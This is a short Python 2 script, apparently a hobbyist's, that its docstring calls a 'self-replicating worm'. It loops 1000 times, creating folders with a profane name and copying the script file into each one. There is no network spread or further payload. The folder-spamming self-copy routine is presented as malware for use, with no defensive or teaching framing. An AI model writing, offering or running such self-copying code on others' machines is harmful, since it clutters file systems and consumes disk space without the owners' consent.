# !/usr/bin/env python
# Developed By John Melody Me
'''
    This Script is a self-replicating worm.
    ' It creates multiples folders once runned.' 
    Name: ENLFUVAV [CAESAR CIPHER 13]
'''

from sys import argv
import subprocess

script = argv 
name = str(script[0])
print script
print name
for i in range(0,1000):
    directoryName = 'Fuck You' +str(i)
    subprocess.call(['mkdir', directoryName])
    subprocess.call(['cp',name,directoryName])